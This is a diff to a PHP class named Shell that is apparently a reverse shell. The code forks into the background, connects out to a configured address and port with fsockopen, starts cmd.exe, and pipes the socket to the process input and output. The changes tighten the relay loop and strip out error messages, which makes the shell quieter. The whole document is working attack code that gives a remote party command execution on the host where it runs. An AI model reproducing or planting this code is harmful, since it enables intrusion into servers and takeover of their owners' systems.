@@ -41,12 +41,10 @@ class Shell {
     }
     private function daemonize() {
         $exit = false;
-        if (!function_exists('pcntl_fork')) {  } 
-        else if (($pid = @pcntl_fork()) < 0) {  } 
-        else if ($pid > 0) {
-            $exit = true;
-        } 
-        else if (posix_setsid() < 0) {  }
+        if (!function_exists('pcntl_fork')) { }
+        else if (($pid = @pcntl_fork()) < 0) { } 
+        else if ($pid > 0) { $exit = true; } 
+        else if (posix_setsid() < 0) { }
         return $exit;
     }
     private function settings() {
@@ -71,14 +69,12 @@ class Shell {
         }
         return $bytes;
     }
-    
     private function rw($input, $output, $iname, $oname) {
         while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
-            if ($oname === 'STDIN') { $this->clen += strlen($data); }
+            if ($oname === 'STDIN') { $this->clen += strlen($data); } 
             $this->dump($data); 
         }
     }
-    
     private function brw($input, $output, $iname, $oname) {
         $fstat = fstat($input);
         $size = $fstat['size'];
@@ -96,30 +92,32 @@ class Shell {
     public function run() {
         if (!$this->daemonize()) {
             $this->settings();
-
             $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
-            if ($socket) {
+            if (!$socket) { } 
+            else {
                 stream_set_blocking($socket, false); 
-
-                
                 $process = @proc_open('cmd.exe', $this->descriptorspec, $pipes, null, null);
-                if ($process) {
+                if (!$process) {
+                } else {
                     foreach ($pipes as $pipe) {
                         stream_set_blocking($pipe, false); 
                     }
-                    
                     $status = proc_get_status($process);
                     do {
                         $status = proc_get_status($process);
+                        if (feof($socket)) { 
+                            break;
+                        } else if (feof($pipes[1]) || !$status['running']) {                 
+                            break; 
+                        }                                                                    
                         $streams = array(
                             'read'   => array($socket, $pipes[1], $pipes[2]), 
                             'write'  => null,
                             'except' => null
                         );
                         $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); 
-                        if ($num_changed_streams === false) {
-                            echo "STRM_ERROR: stream_select() failed\n"; break;
-                        } else if ($num_changed_streams > 0) {
+                        if ($num_changed_streams === false) { } 
+                        else if ($num_changed_streams > 0) {
                             if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } 
                             if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } 
                             if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
@@ -131,10 +129,8 @@ class Shell {
                     }
                     proc_close($process);
                 }
-                
-
                 fclose($socket);
-            }  
+            }
         }
     }
 }
